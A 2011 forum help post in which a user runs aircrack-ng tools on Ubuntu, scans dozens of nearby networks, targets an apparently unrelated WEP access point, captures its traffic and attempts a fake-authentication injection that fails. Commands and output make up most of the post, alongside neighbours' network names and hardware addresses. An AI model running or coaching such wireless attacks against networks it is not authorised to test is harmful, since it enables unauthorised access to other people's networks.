---
title: "AWUS036NH and aircrack-ng on Ubuntu 11.10 - Questions and Answers"
date: 2011-11-17
forum: Networking &amp; Wireless
---

### Post by khurtsiya on 2011-11-17
Trying to get things work, but getting error:

> ~$ **sudo su **
root@lptp:/home/bugaga# airmon-ng


Interface	Chipset		Driver

wlan2		Unknown 	rt2800usb - [phy3]

> root@lptp:/home/bugaga# **airmon-ng start wlan2**


Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

PID	Name
4029	dhclient
19495	avahi-daemon
19496	avahi-daemon
19500	NetworkManager
19503	wpa_supplicant
Process with PID 4029 (dhclient) is running on interface wlan2


Interface	Chipset		Driver

wlan2		Unknown 	rt2800usb - [phy3]
				(monitor mode enabled on mon0)

> root@lptp:/home/bugaga# **airmon-ng check kill**


Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

PID	Name
4029	dhclient
19495	avahi-daemon
19496	avahi-daemon
19500	NetworkManager
19503	wpa_supplicant
Process with PID 4029 (dhclient) is running on interface wlan2
Process with PID 19895 (aireplay-ng) is running on interface mon0
Killing all those processes...

> root@lptp:/home/bugaga# **iwconfig**
lo        no wireless extensions.

eth0      no wireless extensions.

wlan2     IEEE 802.11bgn  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry  long limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
          
mon0      IEEE 802.11bgn  Mode:Monitor  Tx-Power=20 dBm   
          Retry  long limit:7   RTS thr:off   Fragment thr:off
          Power Management:on



> root@lptp:/home/bugaga# **airodump-ng mon0**


 CH  3 ][ Elapsed: 1 min ][ 2011-11-17 12:46                                         
                                                                                                            
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                             
                                                                                                            
 00:1E:58:B7:DE:01  -38       49        7    0   1  54 . OPN              tesla                             
 00:11:F5:25:E9:58  -46       49       20    0  11  54   WEP  WEP         itv                               
 F4:EC:38:BA:19:EC  -58       41        9    0  11  54e. WPA2 CCMP   PSK  if0s                              
 00:21:91:0D:45:81  -60       55        3    0   3  54e. WEP  WEP         Chudo                             
 00:27:19:CF:E5:2C  -62       44        0    0   5  54 . WPA2 TKIP   PSK  R-3-145                           
 B0:48:7A:C2:FC:6E  -65        9        0    0   9  54e. WPA2 CCMP   PSK  DeanWiFi                          
 F4:EC:38:9F:70:64  -66       10        0    0   9  54e. WPA2 CCMP   PSK  MY                                
 B0:48:7A:AF:99:76  -67       47        0    0   6  54e. WPA2 CCMP   PSK  admin23                           
 00:22:B0:3F:4F:6F  -67       45        3    0   6  54 . WPA2 CCMP   PSK  whomelan                          
 F4:EC:38:BD:BF:6E  -68       14        4    0   9  54e. WPA2 CCMP   PSK  ANTON                             
 00:90:4C:C0:00:03  -69        3        0    0   6  54e  WPA2 TKIP   PSK  PORNO2                            
 BC:AE:C5:BA:92:44  -72       38        0    0  11  54e  WPA  TKIP   PSK  triolan                           
 00:24:01:BC:38:87  -73       36        0    0   6  54 . WPA2 CCMP   PSK  kupriki                            
 08:10:74:8E:89:EE  -74       13        0    0  11  54   WPA2 CCMP   PSK  Foxgate                            
 D8:5D:4C:DA:DD:14  -75       48        0    0   1  54 . WPA2 CCMP   PSK  TP-LINK_DADD14                     
 00:26:5A:22:92:2A  -75        4        3    0  11  54e. WPA2 CCMP   PSK  dlink                              
 B0:48:7A:B5:44:96  -76       27      330    0   9  54 . WEP  WEP         TP-LINK_B54496                     
 F4:EC:38:C0:D4:10  -76       17        0    0   6  54 . WPA2 CCMP   PSK  Tochka                             
 00:1B:11:37:56:01  -76        8        1    0   6  54   WPA2 CCMP   PSK  ArmadaLine                        
 F4:EC:38:CC:A2:72  -76       26        0    0   4  54e. WPA2 CCMP   PSK  axl                               
 00:18:E7:ED:1F:FF  -76       39        0    0   2  54e. WPA  CCMP   PSK  Neos-MJ                            
 00:21:91:EF:52:B4  -77       23        2    0   6  54 . WPA  TKIP   PSK  dlink                              
 F4:6D:04:A1:F6:FC  -77       27        0    0   1  54e  WPA2 CCMP   PSK  d3nis_WIFI                         
 BC:AE:C5:C6:E5:8C  -77       37        0    0   1  54 . WEP  WEP         SoftAP-8C                          
 00:21:91:D7:C3:FF  -78       29        0    0   6  54 . WPA2 TKIP   PSK  HomeN                              
 54:E6:FC:A5:E3:1E  -78        5        0    0   9  54e. WPA  CCMP   PSK  fly queen                          
 00:11:F5:DE:96:F2  -79        5        0    0   1  54   WEP  WEP         THOMSON                            
 00:1F:1F:80:03:30  -80        4        0    0   9  54e  WPA  TKIP   PSK  RB                                 
 00:11:F5:26:06:AE   -1        0        1    0 108  -1   OPN              <length:  0>                      
 00:1C:F0:91:68:37  -80        2        0    0   1  54e. WPA2 CCMP   PSK  Similet       


> root@lptp:/home/bugaga# **airodump-ng --bssid B0:48:7A:B5:44:96 -c 9 -w captura mon0**


 CH  9 ][ Elapsed: 28 s ][ 2011-11-17 12:48                                         
                                                                                                            
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                         
                                                                                                            
 B0:48:7A:B5:44:96  -75   6      175     1833   11   9  54 . WEP  WEP    OPN  TP-LINK_B54496                
                                                                                                            
 BSSID              STATION            PWR   Rate    Lost  Packets  Probes  


NEW TERMINAL

> root@lptp:/home/bugaga# **aireplay-ng -a B0:48:7A:B5:44:96 -h 00:C1:CA:4A:CB:D3 -1 0 mon0**
12:50:21  Waiting for beacon frame (BSSID: B0:48:7A:B5:44:96) on channel 9

12:50:21  Sending Authentication Request (Open System)

12:50:23  Sending Authentication Request (Open System)

12:50:25  Sending Authentication Request (Open System)

12:50:27  Sending Authentication Request (Open System)

12:50:29  Sending Authentication Request (Open System)

12:50:31  Sending Authentication Request (Open System)

12:50:33  Sending Authentication Request (Open System)

12:50:35  Sending Authentication Request (Open System)

12:50:37  Sending Authentication Request (Open System)

12:50:39  Sending Authentication Request (Open System)

12:50:41  Sending Authentication Request (Open System)

12:50:43  Sending Authentication Request (Open System)

12:50:45  Sending Authentication Request (Open System)

12:50:47  Sending Authentication Request (Open System)

12:50:49  Sending Authentication Request (Open System)

12:50:51  Sending Authentication Request (Open System)
[COLOR="Red"]Attack was unsuccessful. Possible reasons:

    * Perhaps MAC address filtering is enabled.
    * Check that the BSSID (-a option) is correct.
    * Try to change the number of packets (-o option).
    * The driver/card doesn't support injection.
    * This attack sometimes fails against some APs.
    * The card is not on the same channel as the AP.
    * You're too far from the AP. Get closer, or lower
      the transmit rate.[/COLOR]

---

